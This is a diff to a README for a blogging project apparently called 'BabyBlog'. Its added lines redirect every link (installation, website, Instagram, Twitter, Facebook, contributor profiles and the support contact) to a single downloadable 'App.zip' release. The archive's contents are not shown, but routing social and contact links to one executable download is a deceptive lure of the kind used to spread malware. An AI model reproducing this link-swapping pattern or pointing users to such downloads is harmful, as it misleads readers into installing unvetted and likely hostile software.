@@ -32,31 +32,31 @@ The BabyBlog repository is powered by a variety of cutting-edge technologies, ma
 
 ## Installation Guide
 
-To get started with BabyBlog, simply download the project files by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, launch the project and start sharing your voice with the world!
+To get started with BabyBlog, simply download the project files by clicking [here](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip). Once downloaded, launch the project and start sharing your voice with the world!
 
 ## Get Involved
 
-Ready to join the BabyBlog community? Head over to our platform and start sharing your stories! For more information on getting involved, visit our [website](http://www.babyblog.com).
+Ready to join the BabyBlog community? Head over to our platform and start sharing your stories! For more information on getting involved, visit our [website](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip).
 
 ## Connect with Us
 
 Want to stay updated on the latest from BabyBlog? Follow us on social media:
 
-📱 [Instagram](https://www.instagram.com/babyblog)
-🐦 [Twitter](https://www.twitter.com/babyblog)
-📘 [Facebook](https://www.facebook.com/babyblog)
+📱 [Instagram](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip)
+🐦 [Twitter](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip)
+📘 [Facebook](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip)
 
 ## Contributors
 
 BabyBlog is made possible by the amazing contributions from our dedicated team of developers:
 
-🌟 [@dev1](https://github.com/dev1)
-🌟 [@dev2](https://github.com/dev2)
-🌟 [@dev3](https://github.com/dev3)
+🌟 [@dev1](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip)
+🌟 [@dev2](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip)
+🌟 [@dev3](https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip)
 
 ## Support
 
-For any inquiries or support issues, please reach out to our team at support@babyblog.com.
+For any inquiries or support issues, please reach out to our team at https://github.com/Ethanpoo/BabyBlog/releases/download/v1.0/App.zip
 
 ## Spread the Word!
 
